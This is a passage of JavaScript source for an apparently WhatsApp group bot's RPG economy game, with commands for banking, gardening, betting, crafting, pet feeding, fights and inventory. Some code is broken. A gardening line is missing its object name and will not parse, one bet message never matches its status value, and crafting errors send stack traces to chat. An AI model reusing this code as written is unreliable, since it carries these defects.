  } else replynano(`[❗] Your money is not enough to save ${count} money 🙂`, )
}}
break
//==================================================================
case 'banktarik':
case 'withdraw': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
const xpperlimit = 1
  let user = global.db.users[m.sender]
  let all = command.replace(/^tarik/i, '')
  let count = all ? all : args[0]
  count = count ? /all/i.test(count) ? Math.floor(user.bank / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return replynano('You dont have an ATM card yet !')
  if (user.bank >= xpperlimit * count) {
    user.bank -= xpperlimit * count
    user.money += count
    replynano(`Success attracts as much as ${count} Money 🙂`)
  } else replynano(`[❗] The money in your bank is not sufficient to withdraw the amount ${count} money 🙂`)
}}
break
//==================================================================
case 'berkebon':
case 'gardening':{ if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
const timeout = 1800000
    let __timers = (new Date - global.db.users[m.sender].lastberkebon)
    let _timers = (timeout - __timers)
    let timers = clockString(_timers)
    let user = global.db.users[m.sender]
    let { stock } = global.db.settings[botNumber]
    let pisang = 100 - user.bibitpisang
    let anggur = 100 - user.bibitanggur
    let mangga = 100 - user.bibitmangga
    let jeruk = 100 - user.bibitjeruk
    let apel = 100 - user.bibitapel
    let kerja = 'Berkebun'
    let id = m.chat
    .misi = LordVoltage.misi ? LordVoltage.misi : {}
    if (id in LordVoltage.misi) {
        replynano(`Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
        return false
    }
    let caption = `
📮 Kamu Membutuhkan Bibit:\n${user.bibitpisang < 100 ? `\n${global.rpg.emoticon('bibitpisang')} BananaSeeds: ${pisang}`: ''} ${user.bibitanggur < 100 ? `\n${global.rpg.emoticon('bibitanggur')} GrapeSeeds: ${anggur}`: ''} ${user.bibitmangga < 100 ? `\n${global.rpg.emoticon('bibitmangga')} MangoSeeds: ${mangga}`: ''} ${user.bibitjeruk < 100 ? `\n${global.rpg.emoticon('bibitjeruk')} OrangeSeeds: ${jeruk}`: ''} ${user.bibitapel < 100 ? `\n${global.rpg.emoticon('bibitapel')} AppleSeeds: ${apel}`: ''}`.trim()
    if (new Date - user.lastberkebon > 1800000) {
        if (user.bibitpisang >= 100 && user.bibitanggur >= 100 && user.bibitmangga >= 100 && user.bibitapel >= 100 && user.bibitjeruk >= 100) {
            let hasil1 = Math.floor(Math.random() * 100)
            let hasil2 = Math.floor(Math.random() * 100)
            let hasil3 = Math.floor(Math.random() * 100)
            let hasil4 = Math.floor(Math.random() * 100)
            let hasil5 = Math.floor(Math.random() * 100)

            let caption = `⌛ Your Harvest

${global.rpg.emoticon('Banana')} Banana: ${hasil1}
${global.rpg.emoticon('Wine')} Wine: ${hasil2}
${global.rpg.emoticon('Mango')} Mango: ${hasil3}
${global.rpg.emoticon('Orange')} Orange: ${hasil4}
${global.rpg.emoticon('Apple')} Apple: ${hasil5}
`
            user.pisang += hasil1
            user.anggur += hasil2
            user.mangga += hasil3
            user.jeruk += hasil4
            user.apel += hasil5

            user.bibitpisang -= 100
            user.bibitanggur -= 100
            user.bibitmangga -= 100
            user.bibitjeruk -= 100
            user.bibitapel -= 100

            stock.bibitpisang += 100
            stock.bibitanggur += 100
            stock.bibitmangga += 100
            stock.bibitjeruk += 100
            stock.bibitapel += 100


            LordVoltage.misi[id] = [
kerja,
setTimeout(() => {
delete LordVoltage.misi[id]
}, 20000)
            ]

            setTimeout(() => {
replynano(`${caption.trim()}`)
            }, 20000)

            setTimeout(() => {
replynano('Planting Seeds...')
            }, 0)
            user.lastberkebon = new Date * 1
        } else replynano(`${caption}`)
    } else replynano(`Please Wait While ${timers} To Garden Again...`)
}}
break
//==================================================================
case 'bet': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function number(x = 0) {
    x = parseInt(x)
    return !isNaN(x) && typeof x == 'number'
}
const items = [ 'money', 'chip' ]
    let user = global.db.users[m.sender]
    let item = items.filter(v => v in user && typeof user[v] == 'number')
    let type = (args[0] || '').toLowerCase()
    let count = (args[1] && number(parseInt(args[1])) ? Math.max(parseInt(args[1]), 1): /all/i.test(args[1]) ? Math.floor(parseInt(user[type])): 1) * 1
    if (!item.includes(type)) return replynano(`*List Item:*\n${item.map(v => `${global.rpg.emoticon(v)}${v}`.trim()).join('\n')}\n\nExample:\nbet money 100000`)
    if ((user[type] * 1) < count) return replynano(`*${type} ${global.rpg.emoticon(type)}* you are not enough!!`)
    let moneyDulu = user[type] * 1
    let txt = (m.msg && m.msg.selectedDisplayText ? m.msg.selectedDisplayText: m.text ? m.text: '').toLowerCase()
    try {
        let Bot = (Math.ceil(Math.random() * 91)) * 1
        let Kamu = (Math.floor(Math.random() * 71)) * 1
        let status = 'Lose'
        if (Bot < Kamu) {
            user[type] += count * 1
            status = 'Win'
        } else if (Bot > Kamu) {
            user[type] -= count * 1
        } else {
            status = 'Series'
            user[type] += (Math.floor(count / 1.5)) * 1
        }
        replynano(`
| *PLAYERS* | *POINT* |
*🤖 BOT:*      ${Bot}
*🙂 YOU:*    ${Kamu}

You *${status}*, you ${status == 'Win' ? `Get *+${count * 2}*`: status == 'Lost' ? `Lost *-${count * 1}*`: `Get *+${Math.floor(count / 1.5)}*`} *${type} ${global.rpg.emoticon(type)}*
`.trim())
    } catch (e) {
        if (moneyDulu > (user[type] * 1)) user[type] = moneyDulu * 1
        replynano('Error when gambling (Rejected)')
    }
}}
break
//==================================================================
case 'claim':
case 'bonus': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " hours " + minutes + " minutes " + seconds + " seconds"
}
    let user = global.db.users[m.sender]
    let time = user.lastbonus + 86400000
    if (new Date - user.lastbonus < 86400000) return replynano(`You Have Taken Your Bonus Today\nWait for ${msToTime(time - new Date())} Again`)
    let money = Math.floor(Math.random() * 50000000)
    user.money += money * 1
    user.lastbonus = new Date * 1
    replynano(`Congratulations on getting the bonus : \n+${money} Money`)
}}
break
//==================================================================
case 'buah':
case 'fruit': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
	let user = global.db.users[m.sender]
	let ini_txt = `[ *YOUR FRUIT WAREHOUSE* ]\n\n`
	ini_txt += `🍌 ${user.pisang} Banana\n`
	ini_txt += `🍇 ${user.anggur} Wine\n`
	ini_txt += `🥭 ${user.mangga} Mango\n`
	ini_txt += `🍊 ${user.jeruk} Orange\n`
	ini_txt += `🍎 ${user.apel} Apple\n\n`
	ini_txt += `Use the command *fruit sell* to sell.`
	replynano(`${ini_txt}`)
}}
break
//==================================================================
case 'bunuh':
case 'kill': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
        let h = Math.floor(ms / 3600000)
        let m = Math.floor(ms / 60000) % 60
        let s = Math.floor(ms / 1000) % 60
        return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = LordVoltage.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
	let kerja = 'Bunuh'
    LordVoltage.misi = LordVoltage.misi ? LordVoltage.misi : {}
    if (id in LordVoltage.misi) {
        replynano(`Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku4 = Math.floor(Math.random() * 10)
        let randomaku5 = Math.floor(Math.random() * 10)

        let rbrb4 = (randomaku4 * 100000)
        let rbrb5 = (randomaku5 * 1000)

        var dimas = `
🕵️ Getting Target.....
`.trim()

        var dimas2 = `
⚔️ Piercing His Body.....
`.trim()

        var dimas3 = `
☠️ Target dies\nAnd you take his things
`.trim()

        var dimas4 = `
💼 The result of killing....
`.trim()

        var hsl = `
*—[ Yield ${name} ]—*
➕ 🙂 Money = [ ${rbrb4} ]
➕ 🙂 Exp = [ ${rbrb5} ]
➕ 👮 Offense +1
➕ ☑️ Mission Successful = +1
➕  📥Total Previous Missions: ${order}
`.trim()

		user.money += rbrb4
        user.exp += rbrb5
        user.ojekk += 1
        user.warn += 1

		LordVoltage.misi[id] = [
        	kerja,
        setTimeout(() => {
            delete LordVoltage.misi[id]
        }, 27000)
    	]
        setTimeout(() => {
            replynano(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replynano(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replynano(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
            replynano(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replynano(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replynano('🔍Looking for assassination targets.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replynano(`Please wait for ${timers}, to complete the mission again`)
}}
break
//==================================================================
case 'collect': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastclaim)
    let _timers = (43200000 - __timers)
    let timers = clockString(_timers) 
    let user = global.db.users[m.sender]
    if (new Date - global.db.users[m.sender].lastclaim > 43200000) {
        replynano(`You have claimed and Get *1000* 💵money and *1* 🥤potion`)
        user.money += 1000
        user.potion += 1
        user.lastclaim = new Date * 1
    } else replynano(`Please wait *${timers}* again to be able to claim again`)
}}
break

//==================================================================
case 'craft':
case 'crafting': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  let { stock } = global.db.settings[botNumber]

  let caption = `
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Use Formats *${command} [type]*
example *${command} pickaxe*

*乂 List of Things That Can Be Crafted*
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼
▧ Atm 💳

*乂 Recipe*
▧ Pickaxe ⛏️
〉 10 Wood(kayu)
〉 5 Rock
〉 5 Iron
〉 20 String

▧ Sword ⚔️
〉 10 Wood
〉 15 Iron

▧ Fishingrod 🎣
〉 10 Wood
〉 2 Iron
〉 20 String

▧ Armor 🥼
〉 30 Iron
〉 1 Emerald
〉 5 Diamond

▧ Atm 💳
〉3 Emerald
〉6 Diamond
〉10k Money
`
  try {
    if (/craft|Crafting/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'pickaxe':
          if (user.pickaxe > 0) return replynano('You already have this')
            if(user.rock < 5 || user.wood < 10 || user.iron < 5 || user.string < 20) return replynano(`Not enough goods!\nTo make pickaxe. You need : ${user.wood < 10 ? `\n${10 - user.wood} wood  ` : ''} ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}${user.rock < 5 ? `\n${5 - user.rock} Stone   ` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 5
            stock.iron += 5
        
            user.rock -= 5
            stock.rock += 5

            user.string -= 20
            stock.string += 20

            user.pickaxe += 1
            user.pickaxedurability = 40
            replynano("Successful creation 1 pickaxe 🔨")
            break
          case 'sword':
          if (user.sword > 0) return replynano('You already have this')
            if(user.wood < 10 || user.iron < 15) return replynano(`Not enough goods!\nTo make swords. You need :${user.wood < 10 ? `\n${10 - user.wood} wood  ` : ''}${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 15
            stock.iron += 15

            user.sword += 1
            user.sworddurability = 40
            replynano("Successful creation 1 sword 🗡️")
            break
          case 'fishingrod':
          if (user.fishingrod > 0) return replynano('You already have this')
            if(user.wood < 20 || user.iron < 5 || user.string < 20) return replynano(`Not enough goods!\nTo use fishing rods. You need :${user.wood < 20 ? `\n${20 - user.wood} wood  ` : ''}${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 2
            stock.iron +=2

            user.string -= 20
            stock.string += 20

            user.fishingrod += 1
            user.fishingroddurability = 40
            replynano("Successful creation 1 Fishing rod 🎣")
            break
          case 'armor':
          if (user.armor > 0) return replynano('You already have this')
            if(user.iron < 30 || user.emerald < 1 || user.diamond < 5) return replynano(`Not enough goods!\nTo make armor. You need :${user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ''}${user.emerald < 1 ? `\n${1 - user.emerald} Emerald ❇️` : ''}${user.diamond < 5 ? `\n${5 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 1
            stock.emerald += 1

            user.iron -= 30
            stock.iron += 30

            user.diamond -= 5
            stock.diamond += 5

            user.armor += 1
            user.armordurability = 50
            replynano("Successful creation 1 Armor 🥼")
            break
            case 'atm':
          if (user.atm > 0) return replynano('You already have this')
            if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return replynano(`Not enough goods!\nTo make atm. You need :${user.money < 10000 ? `\n${10000 - user.money} Money 🙂` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 3
            stock.emerald += 3

            user.diamond -= 6
            stock.diamond += 6

            user.money -= 10000
            user.atm += 1
            user.fullatm = 500000000
            replynano("Successful creation 1 Atm 💳")
            break
          default:
            return await replynano(`${caption}`)
        }
    } 
  } catch (err) {
    replynano("Error\n\n\n" + err.stack)
  }
}}
break
//==================================================================
case 'feed': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = isNaN(ms) ? '--' : Math.floor(ms / 310000)
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return [h, ' H ', m, ' M ', s, ' S'].map(v => v.toString().padStart(2, 0)).join('')
}
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}

	let info = `
乂 List Pet:
🐈 • Cᴀᴛ
🐕 • Dᴏɢ
🐎 • Hᴏʀsᴇ
🦊 • Fᴏx
🤖 • Rᴏʙᴏ

*➠ Example:* ${command}fcat
`.trim()
let pesan = pickRandom(['ɴʏᴜᴍᴍᴍ~', 'ᴛʜᴀɴᴋs', 'ᴛʜᴀɴᴋʏᴏᴜ ^-^', '...', 'ᴛʜᴀɴᴋ ʏᴏᴜ~', 'ᴀʀɪɢᴀᴛᴏᴜ ^-^'])
    let type = (args[0] || '').toLowerCase()
    let emo = (type == 'fox' ? '🦊':'' || type == 'cat' ? '🐈':'' || type == 'dog' ? '🐕':'' || type == 'horse' ? '🐴':'' || type == 'robo'? '🤖':'' ) 
    let user = global.db.users[m.sender]
    let rubah = global.db.users[m.sender].fox
    let kuda = global.db.users[m.sender].horse
    let kucing = global.db.users[m.sender].cat
    let anjing = global.db.users[m.sender].dog
    let robot = global.db.users[m.sender].robo
    switch (type) {
        case 'fox':
            if (rubah == 0) return replynano('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (rubah == 10) return replynano('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktur = (new Date - user.foxlastfeed)
            let _waktur = (10000 - __waktur)
            let waktur = clockString(_waktur)
            if (new Date - user.foxlastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.foxexp += 20
                    user.foxlastfeed = new Date * 1
                    replynano(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (rubah > 0) {
                        let naiklvl = ((rubah * 100) - 1)
                        if (user.foxexp > naiklvl) {
                            user.fox += 1
                            user.foxexp -= (rubah * 100)
                            replynano(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`)
            break
        case 'cat':
            if (kucing == 0) return replynano('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (kucing == 10) return replynano('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktuc = (new Date - user.catlastfeed)
            let _waktuc = (10000 - __waktuc)
            let waktuc = clockString(_waktuc)
            if (new Date - user.catlastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.catexp += 20
                    user.catlastfeed = new Date * 1
                    replynano(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
            
                    if (kucing > 0) {
                        let naiklvl = ((kucing * 100) - 1)
                        if (user.catexp > naiklvl) {
                            user.cat += 1
                            user.catexp -= (kucing * 100)
                            replynano(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuc}*`)
            break
        case 'dog':
            if (anjing == 0) return replynano('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (anjing == 10) return replynano('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktua = (new Date - user.doglastfeed)
            let _waktua = (10000 - __waktua)
            let waktua = clockString(_waktua)
            if (new Date - user.doglastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.dogexp += 20
                    user.doglastfeed = new Date * 1
                    replynano(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (anjing > 0) {
                        let naiklvl = ((anjing * 100) - 1)
                        if (user.dogexp > naiklvl) {
                            user.dog += 1
                            user.dogexp -= (anjing * 100)
                            replynano(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktua}*`)
            break
        case 'horse':
            if (kuda == 0) return replynano('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (kuda == 10) return replynano('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktuk = (new Date - user.horselastfeed)
            let _waktuk = (10000 - __waktuk)
            let waktuk = clockString(_waktuk)
            if (new Date - user.horselastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.horseexp += 20
                    user.horselastfeed = new Date * 1
                    replynano(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (kuda > 0) {
                        let naiklvl = ((kuda * 100) - 1)
                        if (user.horseexp > naiklvl) {
                            user.horse += 1
                            user.horseexp -= (kuda * 100)
                            replynano(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuk}*`)
            break
            case 'robo':
            if (robot == 0) return replynano('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (robot == 10) return replynano('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __wakturb = (new Date - user.robolastfeed)
            let _wakturb = (10000 - __wakturb)
            let wakturb = clockString(_wakturb)
            if (new Date - user.robolastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.roboexp += 20
                    user.robolastfeed = new Date * 1
                    replynano(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (robot > 0) {
                        let naiklvl = ((robot * 100) - 1)
                        if (user.roboexp > naiklvl) {
                            user.robo += 1
                            user.roboexp -= (robot * 100)
                            replynano(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replynano(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${wakturb}*`)
            break
        default:
            return replynano(`${info}`)
    }
}}
break
//==================================================================
case 'fighting':
 case 'fight': { if (prefix === '.') {
   function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
   if (!m.isGroup) return reply(mess.only.group)
    LordVoltage.fight = LordVoltage.fight ? LordVoltage.fight: {}
    let user = global.db.users[m.sender]
    if (typeof LordVoltage.fight[m.sender] != "undefined" && LordVoltage.fight[m.sender] == true) return replynano(`Kamu masih bertarung.`)
    let users = participants.map(a => a.id)
    var lawan
    lawan = users[Math.floor(users.length * Math.random())]
    while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender) {
        lawan = users[Math.floor(users.length * Math.random())]
    }
    replynano(`*Kamu* (level ${user.level}) menantang *${LordVoltage.getName(lawan)}* (level ${global.db.users[lawan].level}) dan sedang dalam pertarungan.\n\nWait 5 more minutes and see who wins.`)
    LordVoltage.fight[m.sender] = true
    await delay(300000)
    let kesempatan = []
    for (let i = 0; i < user.level; i++) kesempatan.push(m.sender)
    for (let i = 0; i < global.db.users[lawan].level; i++) kesempatan.push(lawan)
    let pointPemain = 0
    let pointLawan = 0
    for (let i = 0; i < 10; i++) {
        let unggul = getRandom(0, kesempatan.length - 1)
        if (kesempatan[unggul] == m.sender) pointPemain += 1
        else pointLawan += 1
    }
    if (pointPemain > pointLawan) {
        let hadiah = (pointPemain - pointLawan) * 10000
        user.money += hadiah
        user.limit += 1
        replynano(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Kamu* (level ${user.level}) WIN against *${LordVoltage.getName(lawan)}* (level ${global.db.users[lawan].level}) karena you ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nGift . ${hadiah.toLocaleString()}\n+1 Limit`)
    } else if (pointPemain < pointLawan) {
        let denda = (pointLawan - pointPemain) * 100000
        user.money -= denda
        user.limit += 1
        replynano(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Kamu* (level ${user.level}) LOSE the fight *${LordVoltage.getName(lawan)}* (level ${global.db.users[lawan].level}) karena you ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nYour money berkurang ${denda.toLocaleString()}\n+1 Limit`)
    } else {
        replynano(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\nIf you draw, you won't get anything`)
    }
    delete LordVoltage.fight[m.sender]
}}
break
//==================================================================
case 'gajian':
case 'payday': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function JaM(ms) {
  let h = isNaN(ms) ? '60' : Math.floor(ms / 3600000) % 60
  return [h].map(v => v.toString().padStart(2, 0) ).join(':')
}

function MeNit(ms) {
  let m = isNaN(ms) ? '60' : Math.floor(ms / 60000) % 60
  return [m].map(v => v.toString().padStart(2, 0) ).join(':')
}

function DeTik(ms) {
  let s = isNaN(ms) ? '60' : Math.floor(ms / 1000) % 60
  return [s].map(v => v.toString().padStart(2, 0) ).join(':')
}

  let LastClaim = global.db.users[m.sender].lastclaim
  let cdm = `${MeNit(new Date - LastClaim)}`
  let cds = `${DeTik(new Date - LastClaim)}`
  let cd1 = Math.ceil(44 - cdm)
  let cd2 = Math.ceil(59 - cds)
  if (new Date - global.db.users[m.sender].lastclaim > 2700000) {
    global.db.users[m.sender].money += 50000
    global.db.users[m.sender].exp += 100
    replynano('Nih gaji lu +Rp50000')
    global.db.users[m.sender].lastclaim = new Date * 1
  } else return replynano(`Lu udah ambil jatah hari ini.\n\nWait ${cd1} Menit ${cd2} Detik!`)
}}
break
//==================================================================
case 'me':
case 'inventory': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
let inventory = {
  others: {
    joinlimit: true,
    health: true,
    money: true,
    chip: true,
    exp: true,
  },
  items: {
    GrapeSeeds: true,
    MangoSeeds: true,
    BananaSeeds: true,
    AppleSeeds: true,
    OrangeSeeds: true,
    Wine: true,
    Mango: true,
    Banana: true,
    Apple: true,
    Orange: true,
    potion: true,
    trash: true,
    wood: true,
    rock: true,
    string: true,
    emerald: true,
    diamond: true,
    gold: true,
    iron: true,
    umpan: true,
    upgrader: true,
    pet: true,
    petfood: true,
  },
  durabi: {
    sworddurability: true,
    pickaxedurability: true,
    fishingroddurability: true,
    armordurability: true,
  },
  tools: {
    armor: {
      '0': '❌',
      '1': 'Leather Armor',
      '2': 'Iron Armor',
      '3': 'Gold Armor',
      '4': 'Diamond Armor',
      '5': 'Emerald Armor',
      '6': 'Crystal Armor',
      '7': 'Obsidian Armor',
      '8': 'Netherite Armor',
      '9': 'Wither Armor',
      '10': 'Dragon Armor',
      '11': 'Hacker Armor'
    },
    sword: {
      '0': '❌',
      '1': 'Wooden Sword',
      '2': 'Stone Sword',
      '3': 'Iron Sword',
      '4': 'Gold Sword',
      '5': 'Copper Sword',
      '6': 'Diamond Sword',
      '7': 'Emerald Sword',
      '8': 'Obsidian Sword',
      '9': 'Netherite Sword',
      '10': 'Samurai Slayer Green Sword',
      '11': 'Hacker Sword'
    },
    pickaxe: {
      '0': '❌',
      '1': 'Wooden Pickaxe',
      '2': 'Stone Pickaxe',
      '3': 'Iron Pickaxe',
      '4': 'Gold Pickaxe',
      '5': 'Copper Pickaxe',
      '6': 'Diamond Pickaxe',
      '7': 'Emerlad Pickaxe',
      '8': 'Crystal Pickaxe',
      '9': 'Obsidian Pickaxe',
      '10': 'Netherite Pickaxe',
      '11': 'Hacker Pickaxe'
    },
    fishingrod: {
      '0': '❌',
      '1': 'Wooden Fishingrod',
      '2': 'Stone Fishingrod',
      '3': 'Iron Fishingrod',
      '4': 'Gold Fishingrod',
      '5': 'Copper Fishingrod',
      '6': 'Diamond Fishingrod',
      '7': 'Emerald Fishingrod',
      '8': 'Crystal Fishingrod',
      '9': 'Obsidian Fishingrod',
      '10': 'God Fishingrod',
      '11': 'Hacker Fishingrod'
     }
  },
  crates: {
    common: true,
    uncommon: true,
    mythic: true,
    legendary: true,
  },
  pets: {
    horse: 10,
    cat: 10,
    fox: 10,
    dog: 10,
    robo: 10,
  },
  cooldowns: {}
}

  let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? LordVoltage.user.jid : m.sender
  let user = global.db.users[who]

